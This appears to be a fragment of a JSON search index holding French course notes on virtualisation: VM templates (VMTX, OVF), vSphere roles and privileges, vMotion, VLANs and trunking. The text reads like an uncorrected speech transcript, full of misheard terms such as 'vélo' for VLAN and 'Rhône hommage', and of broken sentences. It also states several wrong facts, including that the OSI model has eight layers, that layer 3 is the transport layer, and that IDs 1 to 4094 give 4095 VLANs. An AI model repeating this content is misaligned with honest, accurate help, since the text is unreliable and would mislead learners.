r\u00e9f\u00e9rence , mais on la clone cuit ou g\u00e9n\u00e8re un mod\u00e8le \u00e0 partir de ce clown .Il est possible de faire la m\u00eame chose \u00e0 partir d'un mod\u00e8le , on peut d\u00e9ployer un nouveau mod\u00e8le \u00e0 partir d'un mod\u00e8le existant , puis effectuer un clone vers une machine virtuelle le .Le mod\u00e8le VMTX apporte beaucoup plus de souplesse que les mod\u00e8les OVF si l'on souhaite personnaliser un mod\u00e8le VMTX . Dans ce cas l\u00e0 , il faut un pass\u00e9 par du Rh\u00f4ne hommage et on pourra vous renommer la machine virtuelle avant de la convertir en mod\u00e8le . Attention \u00e0 l'adresse AJP , il est conseill\u00e9 de laisser un adresse \u00e0 JP automatique pour \u00e9viter que les machines virtuelles g\u00e9n\u00e9r\u00e9es \u00e0 partir des mod\u00e8les aient une adresse IP identique . Et comme nous l'avons vu pr\u00e9c\u00e9demment , la r\u00e9g\u00e9n\u00e9rationde l'identifiant unique de s\u00e9curit\u00e9 , le SID doit \u00eatre faite pour les machines Windows. Dans ce cas l\u00e0 , le pr\u00e9requis avant la Constitution du VMTX sera de faire 6 sprp et lors de la g\u00e9n\u00e9ration d'une nouvelle VM \u00e0 partir du mod\u00e8le VMTX , le 6 premier red\u00e9finira \u00e0 nouveau SAID unique . Les \u00e9tapes pour mettre en place 1 la premi\u00e8re est de cr\u00e9er une machine virtuelle de r\u00e9f\u00e9rence dite masterinstaller les outils d'int\u00e9gration , le type VL tous puis convertir la machine virtuelle en mod\u00e8le .Nous voyons ici un aper\u00e7u de l'interface d'administration du mod\u00e8le VMTX . Nous choisissons donc par exemple un dossier ici le dossier XP , puis \u00e0 l'int\u00e9rieur , nous allons voir les diff\u00e9rentes fonctionnalit\u00e9s . Nous avons donc le nom de l'ordinateur , la licence Windows , le mot de passe admin le ciseau ouvert le nombre d'ex\u00e9cutions du mod\u00e8le VMTX , la configuration r\u00e9seau , l'int\u00e9gration au groupe de travail ou du domaine, les diff\u00e9rentes options , la sauvegarde et enfin la fonction pr\u00e9 intermin\u00e9e indique que nous allons pouvoir convertir la machine virtuelle en mod\u00e8le VMTX . Tous ces param\u00e8tres que nous allons pouvoir g\u00e9rer manuellement vont permettre d'avoir ensuite un d\u00e9ploiement de machines virtuelles totalement automatis\u00e9es .  </p>"},{"location":"Virtualisation/gestion_datacenter/#modeles-ovf","title":"Modeles OVF","text":"<p>Nous avons vu pr\u00e9c\u00e9demment que les mod\u00e8les pouvaient \u00eatre not\u00e9s VMTX mais \u00e9galement de type OVF la diff\u00e9rence majeure entre les mod\u00e8les VMTX est OVF sont leur compatibilit\u00e9 en effet le VMTX reste un mod\u00e8le tr\u00e8s sp\u00e9cifique qui contient beaucoup de param\u00e8tres mais qui reste propre \u00e0 la solution de virtualisation visuelle il ?Mod\u00e8le le mod\u00e8le OVF qui a la diff\u00e9rence du VMTX va \u00eatre employ\u00e9 sur toutes les plateformes de virtualisationOVF veut dire open virtual machine format c'est un format standard il va faciliter les importations et exportations de machines virtuelles sur les plates formes ?Les fichiers mod\u00e8les g\u00e9n\u00e9r\u00e9s vous contenir le fichier de configuration de la machine virtuelle ainsi que le ou les fichiers de type disque dur .Si ces fichiers de type disque dur proviennent d'une solution V moins le format sera VMDK .Les plateformes qui prennent en charge les mod\u00e8les OVF vont \u00eatre prouv\u00e9s moins RVMR Player workstation et vais sph\u00e8re les solutions de virtualisation de type poste de travail Virtual box ex serveur et les ?Et les outils permettant le rapport pour y perver seront Q \u00e9mu sur l'hyperviseur KVEn r\u00e9sum\u00e9 , l'o VF peut servir de valises ou de cartons de transport des diff\u00e9rents \u00e9l\u00e9ments n\u00e9cessaires \u00e0 une machine virtuelle .  </p>"},{"location":"Virtualisation/gestion_datacenter/#utilisateurs-et-privileges","title":"Utilisateurs et privil\u00e8ges","text":"<p>Dans une veste vert il y a un nombre important de fonctionnalit\u00e9s et \u00e9galement un nombre tr\u00e8s important d'objets chaque objet comme nous l'avons vu pr\u00e9c\u00e9demment va n\u00e9cessiter des comp\u00e9tences techniques diff\u00e9rentes nous pouvons citer les objets r\u00e9seaux ou les objets de stockage .Pour \u00eatre administr\u00e9 correctement un nombre important d'intervenants va \u00eatre n\u00e9cessaire en fonction des capacit\u00e9s de chaque personnepour pouvoir g\u00e9rer les acc\u00e8s \u00e0 ces fonctionnalit\u00e9s .La solution vient se faire va permettre de g\u00e9rer des privil\u00e8ges en fonction d'utilisateurs et de regrouper ses utilisateurs dans des groupes d'administration en .Peut \u00eatre important de restreindre les privil\u00e8ges d'acc\u00e8s \u00e0 certains utilisateurs .Pour \u00e9viter que des acc\u00e8s non autoris\u00e9s soient effectu\u00e9s sur des objets critiques , par exemple , il faut \u00e9viter qu'\u00e0 qu'une personne puisse \u00e9teindre une machine virtuelle . Eh bien , nous allons cr\u00e9er des r\u00f4les et ces r\u00f4les , nous allons les attribuer \u00e0 des groupes d'utilisateurs .La gestion des utilisateurs peut se faire \u00e0 2 niveaux . Il est possible de g\u00e9rer les utilisateurs d'un autre de virtualisation , un n\u0153ud SXXI et dans ce cas l\u00e0 , nous g\u00e9rons les droits sur chaque hyperviseur . Il est \u00e9galement possible de g\u00e9rer les droits de mani\u00e8re globale \u00e0 partir du V Center .Dans le cas du V Center , il est important de sp\u00e9cifier que un concept de domaine sera tr\u00e8s utile pour pouvoir g\u00e9rer de mani\u00e8re globale les utilisateurs .En effet , le . Le Center va rechercher dans la base de donn\u00e9es du domaine . La liste des utilisateurs ainsi que la liste des groupes et leur appartenance au sein de ses propres groupes. Gr\u00e2ce \u00e0 ce lien avec le contr\u00f4leur de domaine , les r\u00f4les vont pouvoir \u00eatre associ\u00e9s \u00e0 des groupes de s\u00e9curit\u00e9 d\u00e9j\u00e0 pr\u00e9sents dans l'actif directory .Nous pouvons prendre par exemple un groupe nomm\u00e9 support dans l'actif directory , ce groupe ne met support va correspondre au r\u00f4le support de machine virtuelle pr\u00e9sent dans vescefer . La m\u00e9thodologie pour affecter un utilisateur va \u00eatre dans un premier temps de cr\u00e9er cet utilisateur .Puis de cr\u00e9er les groupes et d'affecter les utilisateurs , c'est groupe. Enfin de cr\u00e9er des r\u00f4les ou d'affecter les privil\u00e8ges des utilisateurs assez roubles sp\u00e9cifiques .Enfin , une fois les r\u00f4les d\u00e9termin\u00e9s et les utilisateurs associ\u00e9s \u00e0 ces r\u00f4les , nous allons lier ces r\u00f4les \u00e0 des objets de notre data Center , ces objets peuvent \u00eatre unhyperviseur , un \u00e9l\u00e9ment de l'hyperviseur comme 1 switch , un data Store .U des \u00e9l\u00e9ments sp\u00e9cifiques comme l'arr\u00eat d'une machine virtuelle , le clonage du machine virtuel , l'utilisation de mod\u00e8les . Il faut bien comprendre que dans une vie sph\u00e8re , tous les \u00e9l\u00e9ments sont des objets et sur chacun de ces objets , il va \u00eatre possible pour un r\u00f4le pr\u00e9cis de g\u00e9rer les droits .Des droits de cr\u00e9ation , de modifications , de suppressions , mais \u00e9galement des actions comme la mise en veille , le d\u00e9placement , le changement d'hyperviseur . Tous ces droits vont pouvoir \u00eatre r\u00e9partis dans des r\u00f4les diff\u00e9rents , associ\u00e9s \u00e0 des groupes ou \u00e0 des utilisateurs diff\u00e9rents .Quelques bonnes pratiques , il est pr\u00e9f\u00e9rable d'utiliser des groupes plut\u00f4t que des utilisateurs . En effet , une veste va \u00eatre soumis \u00e0 \u00e9volution . Et dans ce cas l\u00e0 , il est beaucoup plus facile d'ajouter des nouveaux utilisateurs \u00e0 des groupes d\u00e9j\u00e0 existants. Il faut \u00e9viter d'affecter trop de privil\u00e8ges \u00e0 des utilisateurs qui n'en b\u00e9n\u00e9ficient , qui n'en n\u00e9cessitent pas , pardon , c'est .Je m'offre plus de privil\u00e8ges n\u00e9cessaires il peut \u00eatre dupliqu\u00e9 ou modifi\u00e9 un r\u00f4le peut servir de base vers un r\u00f4le dupliqu\u00e9 qui contiendra moins de privil\u00e8ges ?Il est important de d\u00e9finir des r\u00e8gles \u00e0 l'avance sur chaque \u00e9l\u00e9ment en partant du plus haut niveau en effet les \u00e9l\u00e9ments de haut niveau comme les clusters les datacenters levacenter vont ensuite par h\u00e9ritage propager les droits vers les \u00e9l\u00e9ments de niveau inf\u00e9rieur .R\u00e9sum\u00e9 il est important de bien d\u00e9finir le r\u00f4le de chaque utilisateur dans la vraie sph\u00e8re afin d'\u00e9viter les risques d'arr\u00eat de production ou la suppression d'objets critiques .  </p>"},{"location":"Virtualisation/gestion_datacenter/#deplacement-de-vm","title":"D\u00e9placement de VM","text":"<p>Pr\u00e9c\u00e9demment nous avons vu qu'il existait des fonctionnalit\u00e9s avanc\u00e9es dans la virtualisation du cerveau alors oui c'est fonctionnalit\u00e9 il y a la possibilit\u00e9 de d\u00e9placer une machine virtuelle d'un hyperviseur vers un autre hyperviseur sans avoir besoin d'arr\u00eater le fonctionnement de cette machine virtuelle .Nous r\u00e9sumons le fonctionnement d'une machine virtuelle elle n\u00e9cessite un ensemble de ressources 0 . Ces ressources vont \u00eatre soit directement h\u00e9berg\u00e9es sur l'h\u00f4te de virtualisation . C'est le cas des ressources type CPU RAM et r\u00e9seau soient .Vont \u00eatre h\u00e9berg\u00e9s sur des solutions ind\u00e9pendantes \u00e0 un autre 2 virtualisation c'est le cas par exemple pour le stockage lorsqu'on utilise des solutions de stockage de type San la fonction de d\u00e9placement de machines virtuelles va voir comme pr\u00e9 requis le fait que son stockage ne soit plus d\u00e9pendant d'un h\u00f4te du data Centeren effet si une machine virtuelle est stock\u00e9e sur un de ces h\u00f4tes lors du d\u00e9placement il faut \u00e9galement d\u00e9placer la totalit\u00e9 du stockage pendant .Ce d\u00e9placement de stockage aucune \u00e9criture de fichier ne serait possible et nous serions oblig\u00e9s d'\u00e9teindre la machine virtuelle .Le premier pr\u00e9requis va \u00eatre de d\u00e9porter le stockage de cette machine virtuelle vers une solution autonome .Concernant les autres ressources , RAM et CPU , c'est ressources vont \u00eatre identiques sur l'hyperviseur , vers lequel nous allons nous d\u00e9placer donc .Nous pouvons facilement d\u00e9placer la machine virtuelle \u00e0 condition que les ressources CPURM soient suffisantes et disponibles sur l'hyperviseur de destination .Concernant l'acc\u00e8s au r\u00e9seau , nous avons vu dans le module concernant le r\u00e9seau qu'il \u00e9tait possible d'avoir une fonctionnalit\u00e9 r\u00e9seau qui ne d\u00e9pendait pas d'un hyperviseur . Cette fonctionnalit\u00e9 est le VDS pour virtuel distributate switch .Pour r\u00e9sumer la configuration n\u00e9cessaire , la m\u00e9decine virtuelle ne doit plus d\u00e9pendre pour sans stockage ni son acc\u00e8s au r\u00e9seau . Dan hyperviseur .Un autre pr\u00e9requis va \u00eatre n\u00e9cessaire , c'est la fonctionnalit\u00e9 dite Vemotion . \u00c7a ne fonctionnalit\u00e9 , nous l'avons aper\u00e7u lors de la cr\u00e9ation de VSS de V switch standard . En effet , cette fonctionnalit\u00e9 doit \u00eatre pr\u00e9sente sur un vais switch standard. Dans le cadre du d\u00e9placement d'une machine virtuelle , la totalit\u00e9 des fichiers de configuration va \u00eatre d\u00e9plac\u00e9e par un r\u00e9seau d\u00e9di\u00e9 . Il est important que ce r\u00e9seau est de tr\u00e8s bonnes performances pour limiter le temps de d\u00e9placement de la machine virtuelle .La fonction storage \u00e9motionne va permettre de d\u00e9placer \u00e0 chaud le stockage de la machine virtuelle d'une VM d'un dot Store vers un autre data Store .Il est possible d'effectuer les 2 actions simultan\u00e9ment . D\u00e9placement du stockage de la VM d'un data Store vers un autre data Store sans arr\u00eat de la machine virtuelle et \u00e9galement d\u00e9placement difficile de configuration de la machine virtuelle d'un interviseur vers un autre hyperviseur sans arr\u00eat de celle ci, les pr\u00e9requis vont \u00eatre que les 2 hyperviseurs doivent \u00eatre capables de communiquer sur un r\u00e9seau d\u00e9di\u00e9 le r\u00e9seau de type V motion .</p>"},{"location":"Virtualisation/gestion_datacenter/#vmotion-et-storage-vmotion","title":"vMotion et Storage vMotion","text":"<p>La mise en place de la fonctionnalit\u00e9 V motion historique V motion la n\u00e9cessit\u00e9 que l'ensemble du data Center soit adapt\u00e9 pour pouvoir effectuer des d\u00e9placements manuels de machines virtuelles .En effet , le premier pr\u00e9rotive est la fonctionnalit\u00e9 V motion . Cette fonctionnalit\u00e9 se trouve dans un groupement de porcs de type VM Carell , regroupement de port de type VM carnel doit \u00eatre pr\u00e9sent sur un V switchet ce V switch doit pouvoir communiquer sur le r\u00e9seau Glemmush . Ce r\u00e9seau GMOtion doit \u00eatre li\u00e9 \u00e0 une carte r\u00e9seau physique et tous les hyperviseurs participants \u00e0 la fonction V motion doivent \u00eatre en capacit\u00e9 de communiquer sur ce r\u00e9seau VMH . Il est .Il est important de s\u00e9lectionner une adresse JP propre au r\u00e9seau GV motion . Il est \u00e9galement important d'utiliser un syst\u00e8me de commutation de grandes capacit\u00e9s . En effet , il faut limiter au maximum les dur\u00e9es de d\u00e9placement de machines virtuelles .L'emplacement de stockage des machines virtuelles doit \u00e9galement \u00eatre accessible \u00e0 tous les autres participants au d\u00e9placement de la machine virtuelle . Il est n\u00e9cessaire d'employer un syst\u00e8me de type Sun ou de type NAS . Les data Store de stockage des machines virtuelles doivent \u00eatre disponibles et accessibles sur tous les autres du data Center .Lors d'un d\u00e9placement , on peut choisir de d\u00e9placer une VM vers un autre route ou de d\u00e9placer le stockage de la VM d'un data Store vers un autre data Store . Dans ce cas l\u00e0 la sanction sera la fonction storage V motion .Pour \u00e9viter les probl\u00e8mes de d\u00e9placement de VLM , il y conseille de supprimer tous les p\u00e9riph\u00e9riques de type images o\u00f9 donc lecteur DVD ou lecteur disquette ou carte graphique sp\u00e9cifique . En effet , il ne faut garder aucun p\u00e9riph\u00e9rique li\u00e9 \u00e0 un autre sp\u00e9cifique il .Moi la particularit\u00e9 du CPU lorsque 2 ordres de virtualisation ont 1 de constructeur diff\u00e9rents \u00e7a n'est pas une limitation technique car la veste est capable d'adapter en temps r\u00e9el la topologie mais salon les types de processeurs des \u00e9carts de performance importants peuvent appara\u00eetre .</p>"},{"location":"Virtualisation/gestion_reseau/","title":"Gestion reseau","text":""},{"location":"Virtualisation/gestion_reseau/#les-vlan","title":"Les VLAN","text":"<p>Une solution de virtualisation va h\u00e9berger plusieurs centaines voire plusieurs milliers de machines virtuelles ces machines virtuelles vont toutes avoir un r\u00f4le pr\u00e9cis dans une infrastructure informatique l'acc\u00e8s au r\u00e9seau va \u00eatre d\u00e9terminant pour la communication de ces monsieur virtuel avec l'ensemble des services de l'infrastructureafin de cloisonner ces machines virtuelles l'utilisation de v\u00e9lan peut \u00eatre employ\u00e9e dans une solution de virtualisation les .Dame vont permettre de cloisonner et ainsi de prot\u00e9ger un ensemble de machines du reste du r\u00e9seau de l'infrastructure .Un v\u00e9lan , l'abr\u00e9viation de virtuel L\u00e2ne est un r\u00e9seau logique qui est ind\u00e9pendant du reste de l'infrastructure reste. Les commutateurs virtuels ou r\u00e9els vont employer CV Lane pour pouvoir interconnecter diff\u00e9rents r\u00e9seaux en fonction d'un crit\u00e8re .Les \u00e9l\u00e9ments raccord\u00e9s \u00e0 un v\u00e9lan pourront communiquer uniquement sur les autres raccord\u00e9s sur ce m\u00eame v\u00e9lin . En effet , une machine interconnect\u00e9e sur un v\u00e9lan identifi\u00e9 avec un num\u00e9ro \u00e0 langue de un \u00e0 1000 ne pourra communiquer qu'avec d'autres machines connect\u00e9es sur ce m\u00eame v\u00e9lin . La commutation se fait au niveau de la trame . En effet , l'index de velham se fait par un commutateur .Ce commutateur va taguer la trame en fonction du velan souhait\u00e9 .La mise en \u0153uvre de v\u00e9lanes doit \u00eatre d\u00e9cid\u00e9e de 2 c\u00f4t\u00e9s . On est .En effet , le velan doit \u00eatre employ\u00e9 du c\u00f4t\u00e9 physique sur les commutateurs physiques et \u00e9galement sur les commutateurs virtuels . Ces commutateurs virtuels sont h\u00e9berg\u00e9s au sein de la solution 2 virtualisation . Nous verrons le d\u00e9tail de leur fonctionnement dans un autre chapitre .Nous avons un exemple ici de r\u00e9partition de commutation de type . En effet , sur un bandeau d'acc\u00e8s r\u00e9seau , nous allons r\u00e9server les ports de un \u00e0 12 pour lever lundi post client .Sur les ports de 13 \u00e0 18 , nous aurons le v\u00e9lo 10 serveurs et sur les ports de 19 \u00e0 24 , nous aurons les v\u00e9lanes pour la t\u00e9l\u00e9phonie .Le r\u00e9sultat de ce d\u00e9coupage sera que les syst\u00e8mes connect\u00e9s sur les ports post clients ne pourront communiquer uniquement entre les .Qui vont circuler sur les ports de un \u00e0 12 seront toutes tagul\u00e9es par le commutateur avec un v\u00e9lan sp\u00e9cifique ce v\u00e9lan sera diff\u00e9rent du v\u00e9lo serveur et \u00e9galement du v\u00e9lo t\u00e9l\u00e9phonique ?Int\u00e9r\u00eats de mettre en \u0153uvre le v\u00e9lan le premier int\u00e9r\u00eat est d'apporter une segmentation au niveau du r\u00e9seau en effet \u00e0 l'int\u00e9rieur d'une solution de virtualisation le nombre de mati\u00e8res virtuelles peut \u00eatre tr\u00e8s importantla mise en place d'un v\u00e9lan va permettre de r\u00e9duire les domaines de diffusion et aussi d'\u00e9viter un ph\u00e9nom\u00e8ne que l'on appelle temp\u00eate de broadcastce ph\u00e9nom\u00e8ne est .Lorsque beaucoup de machines tentent de d\u00e9couvrir les autres machines pr\u00e9sentes \u00e0 leur c\u00f4t\u00e9 et par le jeu de la diffusion Eh bien ces requ\u00eates de d\u00e9couverte vont \u00eatre multipli\u00e9es entre les commutateurs et cette multiplication de requ\u00eates va sur solliciter les commutateurs jusqu'\u00e0 prendre toute la puissance disponible et .Une d\u00e9faillance du commutated pour \u00e9viter cette surdiffusion et \u00e9tant donn\u00e9 le nombre tr\u00e8s important de machines virtuelles Eh bien les machines virtuelles vont \u00eatre segment\u00e9es au niveau de leur acc\u00e8s r\u00e9seau voire l'utilisation des velin .La segmentation va \u00e9galement accro\u00eetre la s\u00e9curit\u00e9 en effet si un logiciel espion ou un programme malveillant se r\u00e9pand \u00e0 l'int\u00e9rieur de la solution de virtualisation par l'acc\u00e8s r\u00e9seau le fait d'avoir isol\u00e9 les machines virtuelles entre elles par l'utilisation des vlanes va permettre d'\u00e9viter une propagation \u00e0 l'ensemble des machines virtuelles du programme malv\u00e9la segmentation permet \u00e9galement d'appliquer des m\u00e9thodes de qualit\u00e9 de service la QOS va permettre de prioriser des flux vers un ensemble de machines virtuelles qui participent \u00e0 des services critiqueson peut donner un exemple ? Le contr\u00f4leur de domaine ou l'ensemble des contr\u00f4leurs de domaine qui participent \u00e0 la r\u00e9alisation d'un domaine actif directory ou d'une for\u00eat active directory. Le fait de segmenter , c'est contre lors du domaine dans un v\u00e9lane identique les .Int\u00e9grer \u00e0 la solution de virtualisation pour les gestions du r\u00e9seau vont nous permettre de mettre en place des r\u00e8gles au niveau des flux et de prioriser ces flux directement au niveau des commutateurs virtuels en effet nous verrons plus loin dans la trame nous pouvons \u00e0 la fois taguer l'identifiant du r\u00e9seau virtuel et nous pouvons \u00e9galement ajouter une valeur de priorit\u00e9le com\u00eatateur virtuel comme le commutateur physique vont lire 7 index de priorit\u00e9 et vont renvoyer le flux les plus prioritaires au r\u00e9seau virtuel d\u00e9termin\u00e9 dans la valise de ville .La segmentation va \u00e9galement permettre d'optimiser l'utilisation du mat\u00e9riel en effet on va d'abord prioriser l'emploi des ressources pour une certaine cat\u00e9gorie de machines virtuelles r\u00e9pondant \u00e0 un v\u00e9lan sp\u00e9cifique on peut citer notamment la t\u00e9l\u00e9phonie sur IP qui n\u00e9cessite d'avoir des acc\u00e8s r\u00e9seau extr\u00eamement rapide afin d'\u00e9viter la perte de qualit\u00e9 de voix ou de vid\u00e9o on ?Donc h\u00e9berger ces machines virtuelles sur des commutateurs virtuels performants et ces commutateurs virtuels vont \u00eatre plac\u00e9s sur les hyperviseurs les plus performants .Il y a toutefois des limites \u00e0 l'utilisation des v\u00e9lanes .Il faut qu'\u00e0 la fois les commutateurs virtuels et les commutateurs physiques prennent en charge la gestion des v\u00e9lanes . Certains commutateurs de bas niveau ne prennent pas en charge . La gestion des v\u00e9las .Tous les commutateurs virtuels de toutes les solutions de virtualisation de serveur vont prendre en charge la gestion des v\u00e9los . La gestion des v\u00e9lanes va se propager \u00e0 la fois au sein de la solution de virtualisation , mais \u00e9galement au sein de chaque machine virtuelle . Attention toutefois \u00e0 bien disposer de la gestion d\u00e9velane en dehors de la solution de virtualisation afin d'avoir une sc\u00e8ne de communication r\u00e9seau compl\u00e8te .Et puis le VLAN n\u00e9cessit\u00e9 une configuration additionnelle . Cette configuration va se faire \u00e0 la fois dans la solution de virtualisation au sein des communicateurs virtuels , mais \u00e9galement au sein des commutateurs physiques en dehors de la solution de virtualisation .Les v\u00e9lins ne vous employaient sur diff\u00e9rents niveaux d'acc\u00e8s au niveau du mod\u00e8le osi en effet , le mod\u00e8le osi est r\u00e9parti en 8 causes . Levelane vont pouvoir \u00eatre int\u00e9gr\u00e9s sur 3 couches diff\u00e9rentes . On .On va \u00e0 ce moment l\u00e0 parler de niveau 2 .Le premier niveau de v\u00e9lane va s'appliquer au niveau des commutateurs et vous s'attribuer en fonction d'imp\u00f4timportant d'un commutateur r\u00e9seau va \u00eatre appliqu\u00e9 \u00e0 un seul et unique VLAM ce qui . Ce qui veut dire que le trafic entrant sur ce port devra \u00eatre tagu\u00e9 sur le v\u00e9lane d\u00e9termin\u00e9 dans le communicateur et .Le trafic sortant sur ce port il sera automatiquement tagu\u00e9 sur le v\u00e9lane d\u00e9termin\u00e9 dans le commutateurtoutes les trames qui ne seront pas tagu\u00e9s sur le v\u00e9lin d\u00e9di\u00e9 \u00e0 ce port seront rejet\u00e9s par le commutateur ?On parle donc de v\u00e9lane de niveau un . Ce v\u00e9lane de niveau un correspond \u00e0 la couche num\u00e9ro 2 du mod\u00e8le osi , la couche est liaison .Sur certains commutateurs , nous pouvons utiliser le v\u00e9lo de niveau 2 , levez l'un de niveau 2 , 20 affecter un tag de v\u00e9lal en fonction de l'adresse Mac, on se situe toujours sur la couche du veau 2 du mod\u00e8le physique puisque nous te r\u00e9veillons avec l'adresse Mac le .Le commutateur ne va pas d\u00e9dier un port mais va lire l'adresse Mac associ\u00e9e dans la Somme et en fonction de la table de correspondance renseign\u00e9e dans le commutateurlorsque l'adresse Mac va matcher dans cette table et bien lartex de veylan Weentz tagu\u00e9 sur cette trame l\u00e0 .L'avantage du v\u00e9lane de niveau 2 est que chaque port peut commuter tous les v\u00e9lins disponibles . L'affectation ne se fera plus sur le bord , mais un paragramme en fonction de l'adresse Mac de destination fournie dans l'intrame .Il existe \u00e9galement un v\u00e9len de 3 niveau . Cevelaine est r\u00e9serv\u00e9 au commutateur capable de lire les paquets IP, l'ensemble des routeurs va \u00eatre en mesure d'effectuer cette lecture . Nous passons donc sur la couche num\u00e9ro 3 du mod\u00e8le osi la gauche transport .Nous allons donc cette fois ci travailler sur l'adresse IP. Cette adresse IP va \u00eatre lue et encore une fois en fonction d'une table de correspondance . La trame va \u00eatre tagu\u00e9e en fonction de l'adresse IP de destination .En r\u00e9sum\u00e9 , c'est 3 niveaux de v\u00e9lane en 3 niveaux de service diff\u00e9rents . Il faut faire tr\u00e8s attention aux renseignements des tables de correspondance Mac ou IP et \u00e9galement savoir si le mat\u00e9riel est capable de prendre en charge ces diff\u00e9rents niveaux de v\u00e9lo .Concernant les commutateurs virtuels , toutes les tous les commutateurs virtuels sont en capacit\u00e9 de travailler sur les v\u00e9lanes de niveau un et de niveau 2 concernant les v\u00e9lins de niveau 3 sur certaines solutions de virtualisation . C'est une fonction additionnelle .Les affectations , on peut affecter un v\u00e9lan directement sur un switch . On peut \u00e9galement affecter un v\u00e9lan sur l'\u00e9quipement final . Cette \u00e9quipement finale peut \u00eatre un poste de travail , un serveur , un t\u00e9l\u00e9phone IP , une imprimante et cetera .Dans ce cas l\u00e0 , si c'est le terminal qui est .\u00c9couter un ce terminal ne pourra communiquer que avec les trames tagu\u00e9s sur le v\u00e9lan attendu .L'utilisation d'everlan est norm\u00e9e . Le protocole correspondant et le 802 . Attention toutefois sur certains mat\u00e9riels propri\u00e9taires , le protocole et le DOT incul .Nous allons voir ici un exemple des trames .Donc le fait d'ajouter l'identification de VLIM , nous allons avoir sur un paquet de 4 .Multipli\u00e9 par 8 bits . Nous avons donc 32 bits \u00e0 disposition pour g\u00e9rer les informations de notre Vladi. Nous avons donc ici en d\u00e9tail une tr\u00eave \u00e0 l'int\u00e9rieur de cette \u00e2me , on retrouve l'adresse Mac source , puis l'adresse Mac de destination . Nous avons donc nos 32 bits de tag v\u00e9la sur la norme 802 .\u00c0 l'int\u00e9rieur , nous avons donc 16 bits pour le tipeee tag protocole identifiaire .Ce type il est d\u00e9tail protocole identifiant va nous permettre d'indiquer l'index de Vladi dans le d\u00e9tail de cette simple , nous voyons \u00e9galement sur 38 , nous allons voir la priorit\u00e9 . Cette valeur de priorit\u00e9 va \u00eatre comprise de 0 \u00e0 7. La valeur de priorit\u00e9 la plus forte va \u00eatre la valeur 0 . Nous voyons donc que sur les 32 bits r\u00e9serv\u00e9s au v\u00e9lane . Nous avons 3 bits qui vont \u00eatre r\u00e9serv\u00e9s \u00e0 la priorit\u00e9 . Cette priorit\u00e9 va comprendre une valeur allant de 0 \u00e0 7 . La valeur l'a plus faible \u00e9tant celle qui sera trait\u00e9e avec la priorit\u00e9 la plus forte .Une trame qui va \u00eatre tagu\u00e9e \u00e0 une valeur \u00e0 0 aurait la priorit\u00e9 par rapport \u00e0 une trame tagu\u00e9e avec une valeur sup\u00e9rieure .Les 12 derniers mythes de notre tag v\u00e9lane vont comprendre le velan ID . C'est cette valeur qui va \u00eatre lue par les commutateurs virtuels et physiques et qui va permettre de diriger la trame vers le port ou le commutateur de destination, levez l'\u00e2ne va \u00eatre r\u00e9f\u00e9renc\u00e9 par une norme , la norme 802 un **** .Le nouvel analyse va \u00e9galement \u00eatre limit\u00e9e . Nous pouvons donc utiliser ici . L'identifiant allons de un \u00e0 4094 .Ce qui rend possible l'utilisation de 4095 v\u00e9lane diff\u00e9rent dans une solution de virtualisation et \u00e9galement dans un r\u00e9seau physique .  </p>"},{"location":"Virtualisation/gestion_reseau/#les-trunks","title":"Les Trunks","text":"<p>Plus pr\u00e9c\u00e9demment l'utilisation de vela les velanes vont nous permettre de r\u00e9server des emplacements r\u00e9seaux dans l'autre solution de virtualisation et cloisonner nos machines virtuelles toutefois l'utilisation des v\u00e9lanes doit \u00eatre fait du c\u00f4t\u00e9 virtuel mais \u00e9galement sur les commutateurs physiques la liaison entre les r\u00e9seaux virtuels et les r\u00e9seaux physiques va se faire par l'interm\u00e9diaire d'une fonctionnalit\u00e9 que l'on appelle le trunken effet un peu la commutateur peut \u00eatre r\u00e9serv\u00e9 \u00e0 un seul velan .Lyon et que les commutateurs physiques doivent \u00eatre en capacit\u00e9 de communaut\u00e9 la totalit\u00e9 des v\u00e9lanes utilis\u00e9s \u00e0 l'int\u00e9rieur de la solution de virtualisation il .Donc cr\u00e9er un point de connexion entre les commutateurs physiques et les commutateurs virtuels ce point de connexion doit \u00eatre en capacit\u00e9 de faire passer la totalit\u00e9 du trafic de la totalit\u00e9 des v\u00e9los ce point de connexion s'appelle le truck le .5 est une capacit\u00e9 sp\u00e9ciale d'un commutateur qu'il soit virtuel ou physique il est g\u00e9n\u00e9ralement associ\u00e9 \u00e0 un port sp\u00e9cifique d'un commutateur physique et il va permettre de relier un 2 commutateur .Dans donc dans notre exemple ici nous avons un assemblage de 3 commutateurs nous .Cette s\u0153ur sont r\u00e9partis avec des v\u00e9lanes de niveau un des points vont \u00eatre assign\u00e9s \u00e0 des v\u00e9lanes sp\u00e9cifiques et chaque commutateur va se voir r\u00e9server un port en particulier dans le cadre du premier commutateur que nous appelons Nantes RDC nous avons le port num\u00e9ro 23 ce port num\u00e9ro 23 va \u00eatre associ\u00e9 en mode trunk et c'est pas vos num\u00e9ros 23 \u00e0 rediriger le flux du v\u00e9lin num\u00e9ro 3 postes clients ainsi que le flux du v\u00e9lane num\u00e9ro 2 t\u00e9l\u00e9phonevers le port num\u00e9ro 23 du comit\u00e9 interm\u00e9diaire appeler Nantes c\u0153ur de r\u00e9seau .Oui \u00e0 partir de ce commutateur Nantes c\u0153ur du r\u00e9seau nous avons le port num\u00e9ro 24 qui va \u00eatre reli\u00e9 au port num\u00e9ro 24 du commutateur Nantes \u00e9tage un support va \u00eatre d\u00e9clar\u00e9 en mode trunk de chaque c\u00f4t\u00e9 aussi bien du commutateur Nantes c\u0153ur de r\u00e9seau que du Nantes \u00e9tage un et ?C'est d'abord vont avoir une communication sur leveland num\u00e9ro 3 et le z\u00e9lan num\u00e9ro 2 .Cet exemple nous montre que les . Le commutateur sont reli\u00e9s entre eux par une fonctionnalit\u00e9 que l'on appelle le truc le .Le trunk n'est pas limit\u00e9 dans le nombre de v\u00e9lins , il est possible de faire communiquer la totalit\u00e9 des v\u00e9lanes disponibles \u00e0 l'int\u00e9rieur n'importe quoi .Il y a plusieurs types et plusieurs crit\u00e8res pour utiliser apporter . En effet , lorsque l'on conna\u00eet la liste des VLN disponibles sur un commutateur , il est facile de d\u00e9clarer dans le Trucks levelane qui vont passer \u00e0 celui ci pour atteindre un autre communauteur .Toutefois , lorsque l'on n'a pas \u00e0 la connaissance de la totalit\u00e9 des v\u00e9lanes disponibles . Il est possible de d\u00e9clarer le port qui va h\u00e9berger la fonctionnalit\u00e9 de Trump en mode Accessdans ce mod\u00e8le , Eh bien le commutateur va communiquer avec non pas un autre commutateur , qu'il soit virtuel ou physique , mais avec un \u00e9quipement terminal , un ordinateur un poste de client , un serveur de t\u00e9l\u00e9phonie et tout autre \u00e9quipement. Dans ce cas l\u00e0 , en mode porc Access et bien secours ne pourra \u00eatre 